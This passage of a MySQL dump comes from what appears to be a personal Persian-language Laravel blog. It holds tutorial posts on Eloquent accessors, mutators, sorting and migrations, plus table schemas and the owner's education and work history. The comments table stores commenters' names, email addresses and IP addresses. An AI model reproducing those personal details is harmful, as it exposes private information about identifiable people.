هستند.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\npublic function setPasswordAttribute($value) {\r\n    $this-&gt;attributes[\'password\'] = Hash::make($value);\r\n}\r\n</code></pre>\r\n\r\n<p>با این روش، شما مطمئنید که رمز عبور همیشه قبل از اینکه در دیتابیس ذخیره شود، هش می‌گردد. من اینجا از فساد Hash در لاراول برای ایجاد رمز عبور هش شده استفاده کردم، اما شما می‌توانید از متود کمکی&nbsp;<code>()bcrypt</code>&nbsp;نیز استفاده نمایید.</p>\r\n\r\n<strong>JSON ENCODING</strong>\r\n\r\n<p>اگر یک بار دیگر به مدل Member ما در ابتدای آموزش توجه کنید، می‌بینید که خصیصه settings برای ذخیره‌سازی اطلاعات شخصی کاربران و امکاناتی که در برنامه شما لحاظ گشته، ایجاد شده است. طبیعتا ممکن است که شما برای مدیریت این امکانات از آرایه استفاده کنید و یکی از بهترین راه‌ها برای ذخیره کردن یک آرایه encode کردن به یک رشته JSON است.</p>\r\n\r\n<p>برای خصیصه&nbsp;&nbsp;<code style=\"font-size: 12.6px;\">settings</code>&nbsp;شما به یک accessor برای decode رشته JSON به آرایه و یک mutator برای encode آرایه به رشته JSON نیاز دارید.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n/**\r\n * Make sure that we get an array from JSON string \r\n *\r\n * @param $value\r\n * @return array\r\n */\r\npublic function getSettingsAttribute($value) {\r\n    return json_decode($value, true);\r\n}\r\n\r\n\r\n/**\r\n * Encode an array to a JSON string\r\n * \r\n * @param $value\r\n */\r\npublic function setSettingsAttribute($value)\r\n{\r\n    $this-&gt;attributes[\'settings\'] = json_encode($value);\r\n}\r\n</code></pre>\r\n\r\n<h3>مثال کامل</h3>\r\n\r\n<p>و در آخر، من یک مدل کامل از Member که در این مقاله استفاده کردم، در اینجا آورده ام:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n<!--?php  namespace App;\r\n\r\nuse Illuminate\\Support\\Facades\\Hash;\r\nuse Illuminate\\Database\\Eloquent\\Model;\r\n\r\n/**\r\n * Class Member\r\n * @package App\r\n */\r\nclass Member extends Model\r\n{\r\n    /**\r\n     * @var array\r\n     */\r\n    protected $fillable = [\'first_name\', \'last_name\', \'email\', \'password\', \'last_login\', \'settings\', \'created_at\', \'updated_at\'];\r\n\r\n    /**\r\n     * Make sure that first name is always capitalized when retrieved from the database\r\n     *\r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function getFirstNameAttribute($value)\r\n    {\r\n        return ucfirst($value);\r\n    }\r\n\r\n    /**\r\n     * Make sure that last name is always capitalized when retrieved from the database\r\n     *\r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function getLastNameAttribute($value)\r\n    {\r\n        return ucfirst($value);\r\n    }\r\n\r\n    /**\r\n     * Get members full name\r\n     *\r\n     * @return string\r\n     */\r\n    public function getFullNameAttribute()\r\n    {\r\n        return ucfirst($this--->first_name) . \' \' . ucfirst($this-&gt;last_name);\r\n    }\r\n\r\n    /**\r\n     * Custom format for the last login date\r\n     *\r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function getLastLoginAttribute($value)\r\n    {\r\n        return \\Carbon\\Carbon::parse($value)-&gt;format(\'d.m.Y.\');\r\n    }\r\n\r\n    /**\r\n     * Make sure that first name is capitalized BEFORE saving it to the database\r\n     *\r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function setFirstNameAttribute($value)\r\n    {\r\n        $this-&gt;attributes[\'first_name\'] = ucfirst($value);\r\n    }\r\n\r\n    /**\r\n     * Make sure that last name is capitalized BEFORE saving it to the database\r\n     *\r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function setLastNameAttribute($value)\r\n    {\r\n        $this-&gt;attributes[\'last_name\'] = ucfirst($value);\r\n    }\r\n\r\n    /**\r\n     * Make sure that password is encrypted\r\n     *\r\n     * @param $value\r\n     */\r\n    public function setPasswordAttribute($value) {\r\n        $this-&gt;attributes[\'password\'] = Hash::make($value);\r\n    }\r\n\r\n    /**\r\n     * Make sure that we get an array from JSON string\r\n     *\r\n     * @param $value\r\n     * @return array\r\n     */\r\n    public function getSettingsAttribute($value) {\r\n        return json_decode($value, true);\r\n    }\r\n\r\n\r\n    /**\r\n     * Encode an array to a JSON string\r\n     *\r\n     * @param $value\r\n     */\r\n    public function setSettingsAttribute($value)\r\n    {\r\n        $this-&gt;attributes[\'settings\'] = json_encode($value);\r\n    }\r\n</code></pre>\r\n\r\n<p>و چگونگی استفاده از آن نیز اینگونه است:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\nRoute::get(\'members\', function() {\r\n    $user = App\\Member::create([\r\n        \'first_name\'  =&gt; \'mirza\',\r\n        \'last_name\'   =&gt; \'pasic\',\r\n        \'email\'       =&gt; \'mirza.pasic@bosnadev.com\',\r\n        \'password\'    =&gt; \'!supersecretpassword!\',\r\n        \'last_login\'  =&gt; Carbon\\Carbon::now(),\r\n        \'settings\'    =&gt; [\'two_factor_aut\' =&gt; true, \'session_time\' =&gt; 1200],\r\n        \'created_at\'  =&gt; Carbon\\Carbon::now(),\r\n        \'updated_at\'  =&gt; Carbon\\Carbon::now()\r\n    ]);\r\n    \r\n    $member = App\\Member::find(1);\r\n    echo $member-&gt;last_login . \'<br>\';\r\n    echo $member-&gt;full_name . \'<br>\';\r\n});\r\n</code></pre>\r\n\r\n<p>واقعا من امیدوارم که تونسته باشم مفهوم mutator و accessor را به شما توضیح بدم و امیدوارم اگر تا پیش از این نمی‌دونستید چه کاربردهایی دارند، حالا برای استفاده از آنها در پروژه هایتان، استفاده کنید.</p>','1510685620mutator-accessor.jpg',1,'Accessors, Mutators , laravel, php','Accessors و Mutators در لاراول',0,1,122,1,1,1,'2017-11-14 14:16:55','2017-11-14 07:18:47','2017-11-15 01:08:50',NULL),(11,'Eloquent: چگونه نتایج را با Mutator Attribute مرتب کنیم؟','eloquent-چگونه-نتایج-را-با-mutator-attribute-مرتب-کنیم','<p>اخیرا با مساله‌ای مواجه شدم که می‌خوام اون و راه حلش رو بگم. لاراول یک ویژگی خاص به نام Mutators دارد که باعث می‌شود شما بتوانید فیلدهایی اضافی که خودکار محاسبه می‌شوند، در مدل Eloquent خود تعریف کنید. اما <span style=\"font-weight: 700;\">orderBy</span> برای مرتب سازی روی این فیلدها کار نمی‌کند، بنابراین برای مرتب‌سازی چه باید کرد؟</p>\r\n\r\n<p>ابتدا یادآوری کنم که چگونه کار می‌کنند. فرض کنید یک مدل <strong>Client.php</strong> و فیلدهای <strong>first_name</strong> و <strong>last_name </strong>را داریم. می‌توانید <strong>full_name</strong> را به صورت زیر تعریف کنید:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\nfunction getFullNameAttribute()\r\n{\r\n  return $this->attributes[\'first_name\'] . \' \' . $this->attributes[\'last_name\'];\r\n}\r\n</code></pre>\r\n \r\n<p>و بعد از آن، وقتی <code>$clients = Client::all();</code> را اجرا می‌کنید، می‌توانید از آن به صورت زیر استفاده کنید:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n@foreach ($clients as $client)\r\n  {{ $client->full_name }}\r\n@endforeach\r\n</code></pre>\r\n \r\n<p>به همین سادگی.</p>\r\n<p>اما اگر بخواهید نتایج را بر اساس full_name مرتب کنید، چه پیش خواهد آمد؟ خب orderBy خطا خواهد داد.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$clients = Client::orderBy(\'full_name\')->get(); // doesn\'t work\r\n</code></pre>\r\n \r\n<p>راه حل خیلی ساده‌ست. ما باید نتایج را بعد از آنکه گرفتیم، مرتب کنیم.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$clients = Client::get()->sortBy(\'full_name\'); // works!\r\n</code></pre>\r\n \r\n<p>توجه کنید که نام این متود <span style=\"color: rgb(199, 37, 78); font-family: Menlo, Monaco, Consolas, \" courier=\"\" new\",=\"\" monospace;=\"\" font-size:=\"\" 12.6px;=\"\" background-color:=\"\" rgb(249,=\"\" 242,=\"\" 244);\"=\"\">sortBy </span>است و orderBy نیست.</p>\r\n<p>همچنین متود<strong><code>sortByDesc()</code></strong>نیز وجود دارد.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$clients = Client::get()->sortByDesc(\'full_name\');\r\n</code></pre>\r\n\r\n<p>در حقیقت <span style=\"background-color: rgb(249, 242, 244); color: rgb(199, 37, 78); font-family: Menlo, Monaco, Consolas, \" courier=\"\" new\",=\"\" monospace;=\"\" font-size:=\"\" 12.6px;\"=\"\">sortBy</span> متودی است که بر روی نتایج Eloquent که Collection هستند، کار می‌کند. شما می‌توانید راجع به تابع<code>sortBy</code> و سایر توابع Collectionها در <a href=\"https://laravel.com/docs/master/collections#method-sortby\" rel=\"nofollow\" target=\"_blank\">اینجا</a> بیشتر مطالعه کنید.</p>','1512153304sortByMutator.jpg',1,'','',0,1,75,1,1,1,'2017-11-28 13:45:44','2017-11-28 06:45:48','2017-12-03 07:32:27',NULL),(12,'توابع has و doesnthave در Eloquent','توابع-has-و-doesnthave-در-eloquent','<p>من هر از گاهی راجع به لاراول نکات کوتاهی می‌نویسم که یکی از مباحث مهم در لاراول، Eloquentها هستند که خیلی داکیومنت های ضعیف یا نامتناسب با توانمندی آن نوشته شده است. یکی از آنها، فیلتر کردن والدها (parents) است با شرط اینکه فرزند داشته باشند یا خیر. با یک مثال توضیح می‌دهم.</p>\r\n\r\n<p>تصور کنید Authors و Books را با یک رابطه 1-n داشته باشیم به طوری که هر Author بتواند یک یا چند Book داشته باشد. به کد در فایل <code>app\\Author.php</code>نگاه کنید:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\npublic function books()\r\n{\r\n    return $this->hasMany(\\App\\Book::class, \'author_id\');\r\n}\r\n\r\n</code></pre>\r\n \r\n<p>حالا اگر بخواهیم فقط Authorهایی را نمایش دهیم که حداقل یک کتاب داشته باشند، چه کنیم؟ به سادگی و با استفاده از متود<code>has()</code>:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$authors = Author::has(\'books\')->get();\r\n\r\n</code></pre>\r\n\r\n<p>هم چنین، متود مخالف آن، برای آنکه Authorهایی را نمایش دهیم که هیچ کتابی ندارند، از متود<code>doesnthave()</code>استفاده می‌کنیم:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$authors = Author::doesnthave(\'books\')->get();\r\n\r\n</code></pre>\r\n \r\n<p>در یک نگاه، نه تنها خیلی ساده‌ست، بلکه خیلی خوانا و قابل فهم هم هست، حتی برای کسانی که دولوپر لاراول نباشند.</p>','1512415099has.jpg',1,'','توابع has و doesnthave در Eloquent',0,0,71,1,1,1,'2017-12-03 08:30:00','2017-11-28 06:46:00','2017-12-04 15:48:19',NULL),(13,'Eloquent: گرفتن آخرین row در یک relation','eloquent-گرفتن-آخرین-row-در-یک-relation','<p>فرض کنید می‌خواهید همه سطرهای یک جدول را به اضافه تنها یک سطر از یک رابطه از آن جدول با جدولی دیگر را بگیرید، دقت کنید نه همه سطرهای مرتبط، تنها یکی و آنهم آخرین سطر را. خیلی ساده‌ست.</p>\r\n\r\n<p>یک مثال واقعی بزنیم. ما یک مدل Authors و Books با یک رابطه 1-n داریم، بنابراین هر author می‌تواند یک یا تعداد بیشتری کتاب داشته باشد. ما می‌خواهیم همه authorها به همراه آخرین کتاب آنها را نمایش دهیم.</p>\r\n\r\n<h2>قدم اول: فایل&nbsp; app/Author.php - متود جدید:</h2>\r\n\r\n<pre><code class=\"php hljs\">\r\npublic function latestBook()\r\n{\r\n    return $this-&gt;hasOne(\'\\App\\Book\')-&gt;latest();\r\n}\r\n\r\n</code></pre>\r\n \r\n<p>متود&nbsp;&nbsp;<code>latest()</code>&nbsp;همه سطرها را با&nbsp;&nbsp;<code>created_at desc</code>مرتب می‌گند و اولین آنها را می‌گیرد.</p>\r\n\r\n<h2>قدم دوم: Controller:</h2>\r\n\r\n<pre><code class=\"php hljs\">\r\n$authors = Author::with(\'latestBook\')-&gt;get();\r\nforeach ($authors as $author) {\r\n    echo $author-&gt;name . \': \' . $author-&gt;latestBook-&gt;title;\r\n}\r\n\r\n</code></pre>\r\n\r\n<p>همچنین شما می‌توانید از&nbsp;&nbsp;<code>oldest()</code>&nbsp;به جای&nbsp;&nbsp;<code>latest()</code>&nbsp;استفاده نمایید، در این صورت اولین رکورد با قانون زیر را برخواهد گردوند:<code>order by created_at asc</code>.</p>',NULL,1,'Eloquent: گرفتن آخرین row در یک relation','Eloquent: گرفتن آخرین row در یک relation',0,0,56,1,1,1,'2017-12-05 15:08:50','2017-12-05 08:10:26','2017-12-10 08:18:10',NULL),(14,'Migration: چطور یک کلید خارجی را drop کنیم؟','migration-چطور-یک-کلید-خارجی-را-drop-کنیم','<p>یکی از مهمترین و در عین حال قسمت‌هایی که اکثر برنامه‌نویسان \r\nلاراول نادیده می‌گیرند، متود drop در فایل‌های migration است. غالب \r\nبرنامه‌نویسان بدون اینکه این بخش را تست بگیرند، به خیال اینکه مشکلی در \r\nکدشان وجود ندارد، migration را انجام داده و از آن می‌گذرند و تنها به تست\r\n متود up بسنده می‌کنند، در حالی که ایجاد خطا در migrate:rollback باعث بروز مشکلاتی برای migrate ایجاد خواهد کرد.</p><p>یکی از مشکلاتی که به وفور دیده می‌شود، در کلید های خارجی است. با مثالی نحوه ایجاد و سپس down آنرا بررسی می کنیم.<br></p><p>فرض کنید که می‌خواهیم یک ستون را که شامل یک کلید خارجی (foreign key) است، از جدول پایگاه داده‌مان حذف کنیم. یعنی در دستورات migrate:rollback، در حالی که پیش از drop کردن کلید خارجی بخواهیم فیلد را drop کنیم، با خطا مواجه خواهیم شد.</p><p>برای حل نمودن این موضوع، ابتدا با متود dropForeign کلید خارجی را حذف کرده، سپس فیلد مورد نظر را drop می‌کنیم.<br>\r\n</p><pre><code class=\"code hljs\">\r\npublic function down()\r\n{\r\n    Schema::table(\'posts\', function(Blueprint $table){\r\n        $table-&gt;dropForeign(\'posts_category_id_foreign\');\r\n        $table-&gt;dropColumn(\'category_id\');\r\n    });\r\n}\r\n</code></pre><p>مشاهده می‌کنید که برای drop کردن کلید خارجی در دستور dropForeign ابتدا نام جدول، سپس نام فیلد و در انتها کلید واژه foreign استفاده می گردد که هر کدام با یک \"_\" از هم جدا می‌شوند.</p><p>بدین ترتیب بدون اینکه مشکلی در rollback ایجاد گردد، یک فایل migration برای ایجاد و حذف یک فیلد با کلید خارجی ساخته ایم.<br></p>',NULL,1,'لاراول, php, foreign key, migration','چطور یک کلید خارجی را drop کنیم',0,0,31,1,1,1,'2017-12-17 16:06:29','2017-12-17 09:13:48','2017-12-26 10:07:26',NULL);
/*!40000 ALTER TABLE `blogs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `categories`
--

DROP TABLE IF EXISTS `categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `categories` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `meta_keywords` text COLLATE utf8_unicode_ci,
  `meta_description` text COLLATE utf8_unicode_ci,
  `hits` int(11) NOT NULL DEFAULT '0',
  `state` int(11) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `categories_created_by_foreign` (`created_by`),
  KEY `categories_updated_by_foreign` (`updated_by`),
  CONSTRAINT `categories_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `categories_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `categories`
--

LOCK TABLES `categories` WRITE;
/*!40000 ALTER TABLE `categories` DISABLE KEYS */;
INSERT INTO `categories` VALUES (1,'لاراول','Laravel','',NULL,'Laravel, لاراول','لاراول',0,1,1,1,'2017-12-03 07:22:27','2017-12-03 07:22:30',NULL),(2,'PHP','php','',NULL,'PHP','PHP',0,1,1,1,'2017-12-03 07:22:51','2017-12-03 07:22:51',NULL);
/*!40000 ALTER TABLE `categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `comments`
--

DROP TABLE IF EXISTS `comments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `comments` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `commentable_id` int(10) unsigned NOT NULL,
  `commentable_type` text COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(10) unsigned DEFAULT NULL,
  `user_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `user_email` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `user_website` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `user_ip` varchar(45) COLLATE utf8_unicode_ci NOT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `likes_count` int(11) NOT NULL DEFAULT '0',
  `dislikes_count` int(11) NOT NULL DEFAULT '0',
  `state` int(11) NOT NULL,
  `status` int(10) NOT NULL DEFAULT '1',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `comments_parent_id_index` (`parent_id`),
  KEY `comments_created_by_foreign` (`created_by`),
  KEY `comments_updated_by_foreign` (`updated_by`),
  KEY `comments_user_id_foreign` (`user_id`),
  CONSTRAINT `comments_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `comments_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`),
  CONSTRAINT `comments_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `comments`
--

LOCK TABLES `comments` WRITE;
/*!40000 ALTER TABLE `comments` DISABLE KEYS */;
INSERT INTO `comments` VALUES (1,'متن جالبی بود،‌خیلی ساده و روون نوشته شده بود و مفهوم رو می رسوند. مرسی',4,'App\\Restaurant',NULL,'محمد','saeed.hajinasiri@gmail.com','saeednasiri.com','217.24.154.4',NULL,0,0,1,2,1,1,'2017-10-28 15:31:56','2017-10-29 03:44:13',NULL),(2,'متن عالی بود ☺ ',4,'App\\Restaurant',NULL,'Samira','roshani.samira@gmail.com','','5.72.106.165',NULL,0,0,1,2,1,1,'2017-10-29 08:13:58','2017-10-29 08:16:06',NULL),(3,'خوب بود، تا حالا از این زاویه بهش نگاه نکرده بودم، ممنون',13,'App\\Restaurant',NULL,'محمد اقبایی','moh.oghbaie@gmail.com','','31.47.32.230',NULL,0,0,1,3,1,1,'2017-12-30 09:45:23','2018-01-07 01:12:31',NULL);
/*!40000 ALTER TABLE `comments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `contacts`
--

DROP TABLE IF EXISTS `contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `contacts` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `user_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `user_email` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `user_id` int(10) unsigned NOT NULL,
  `user_ip` varchar(45) COLLATE utf8_unicode_ci NOT NULL,
  `department_id` int(10) unsigned NOT NULL,
  `assignee_id` int(10) unsigned DEFAULT NULL,
  `state` int(11) NOT NULL,
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `read_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `contacts_created_by_foreign` (`created_by`),
  KEY `contacts_updated_by_foreign` (`updated_by`),
  KEY `contacts_user_id_foreign` (`user_id`),
  KEY `contacts_assignee_id_foreign` (`assignee_id`),
  CONSTRAINT `contacts_assignee_id_foreign` FOREIGN KEY (`assignee_id`) REFERENCES `users` (`id`),
  CONSTRAINT `contacts_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `contacts_id_foreign` FOREIGN KEY (`id`) REFERENCES `departments` (`id`),
  CONSTRAINT `contacts_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`),
  CONSTRAINT `contacts_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `contacts`
--

LOCK TABLES `contacts` WRITE;
/*!40000 ALTER TABLE `contacts` DISABLE KEYS */;
/*!40000 ALTER TABLE `contacts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `department_user`
--

DROP TABLE IF EXISTS `department_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `department_user` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `department_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `department_user_user_id_foreign` (`user_id`),
  KEY `department_user_department_id_foreign` (`department_id`),
  CONSTRAINT `department_user_department_id_foreign` FOREIGN KEY (`department_id`) REFERENCES `departments` (`id`),
  CONSTRAINT `department_user_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `department_user`
--

LOCK TABLES `department_user` WRITE;
/*!40000 ALTER TABLE `department_user` DISABLE KEYS */;
/*!40000 ALTER TABLE `department_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `departments`
--

DROP TABLE IF EXISTS `departments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `departments` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci,
  `state` tinyint(4) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `departments_created_by_foreign` (`created_by`),
  KEY `departments_updated_by_foreign` (`updated_by`),
  CONSTRAINT `departments_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `departments_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `departments`
--

LOCK TABLES `departments` WRITE;
/*!40000 ALTER TABLE `departments` DISABLE KEYS */;
/*!40000 ALTER TABLE `departments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `educations`
--

DROP TABLE IF EXISTS `educations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `educations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `subtitle` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `started_at` timestamp NULL DEFAULT NULL,
  `ended_at` timestamp NULL DEFAULT NULL,
  `right_now` tinyint(4) NOT NULL DEFAULT '0',
  `state` tinyint(4) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `educations_created_by_foreign` (`created_by`),
  KEY `educations_updated_by_foreign` (`updated_by`),
  CONSTRAINT `educations_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `educations_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `educations`
--

LOCK TABLES `educations` WRITE;
/*!40000 ALTER TABLE `educations` DISABLE KEYS */;
INSERT INTO `educations` VALUES (1,'دیپلم ریاضی - فیزیک','دبیرستان فرزانگان کرج','1508156253grad-cap.png','<p>دیپلم ریاضی - فیزیک از دبیرستان فرزانگان کرج<br></p>','2002-09-23 19:46:57','2006-06-21 18:46:57',0,1,1,1,'2017-04-20 14:20:57','2017-10-16 08:47:33',NULL),(2,'لیسانس علوم کامپیوتر','دانشگاه خوارزمی تهران','1508610599grad-cap.png','<p>لیسانس علوم کامپیوتر از دانشگاه خوارزمی تهران واحد پردیس<br></p>','2006-09-23 18:26:39','2011-07-06 17:26:39',0,1,1,1,'2017-10-21 14:59:59','2017-10-21 14:59:59',NULL);
/*!40000 ALTER TABLE `educations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `experiences`
--

DROP TABLE IF EXISTS `experiences`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `experiences` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `subtitle` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `started_at` timestamp NULL DEFAULT NULL,
  `ended_at` timestamp NULL DEFAULT NULL,
  `right_now` tinyint(4) NOT NULL DEFAULT '0',
  `state` tinyint(4) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `experiences_created_by_foreign` (`created_by`),
  KEY `experiences_updated_by_foreign` (`updated_by`),
  CONSTRAINT `experiences_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `experiences_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `experiences`
--

LOCK TABLES `experiences` WRITE;
/*!40000 ALTER TABLE `experiences` DISABLE KEYS */;
INSERT INTO `experiences` VALUES (1,'Web Developer','فارسیکام','1508610026farsicom.jpg','<p> دلیل ترک شغل: ادامه تحصیل و تداخل زمان‌های کاری و ساعات کلاس‌های دانشگاهی<br><br></p>','2009-06-22 19:00:03','2010-11-22 20:00:03',0,1,1,1,'2017-04-20 14:32:14','2017-10-21 14:50:26',NULL),(2,'PHP & Web Developer','پرشین تولز','1508609754persiantools.jpg','<p> ساخت و طراحی بیش از ۱۰۰ وب سایت فروشگاهی، شرکتی، سوشال و غیره. <br></p>','2013-07-23 16:57:39','2016-11-05 17:57:39',0,1,1,1,'2017-10-21 14:29:41','2017-10-21 14:45:54',NULL),(3,'PHP & Laravel Developer','LastSecond.ir','1508609358lastsecond.jpg','<p>Web & Laravel Developer</p>','2016-11-05 18:02:47','2017-10-21 14:34:07',1,1,1,1,'2017-10-21 14:34:07','2017-10-21 14:39:18',NULL);
/*!40000 ALTER TABLE `experiences` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `likes`
--

DROP TABLE IF EXISTS `likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `likes` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned DEFAULT NULL,
  `user_ip` varchar(45) NOT NULL,
  `score_type` int(11) NOT NULL,
  `likable_id` int(10) unsigned NOT NULL,
  `likable_type` varchar(255) NOT NULL,
  `state` int(11) NOT NULL,
